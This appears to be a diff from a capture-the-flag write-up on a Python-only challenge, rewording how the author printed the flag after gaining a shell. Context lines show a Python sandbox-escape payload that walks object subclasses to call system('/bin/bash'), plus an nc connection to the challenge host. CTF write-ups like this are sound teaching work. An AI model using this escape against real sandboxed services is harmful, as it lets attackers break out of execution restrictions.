@@ -44,11 +44,11 @@ Hello, I can only speak Python, show me your code.
 Enter your code : ().__class__.__mro__[1].__subclasses__()[140].__init__.__globals__["System".lower()]("/bin/bash")
 ```
 
-Once we obtained a shell, we explored the file system and discovered the `/flag.txt` file but reading it directly with cat didn't work due to some redirection.
+Once we obtained a shell, we explored the file system and discovered the `/flag.txt` file but reading it directly with cat didn't work (maybe cat not available).
 
-### 3. Bypassing Output Redirection
+### 3. Printing The Flag
 
-To bypass the output redirection, we invoked Python and read the flag:
+To print the flag, we invoked Python and read the flag:
 
 ```bash
 nc snakegame.leisure.tcc 23001
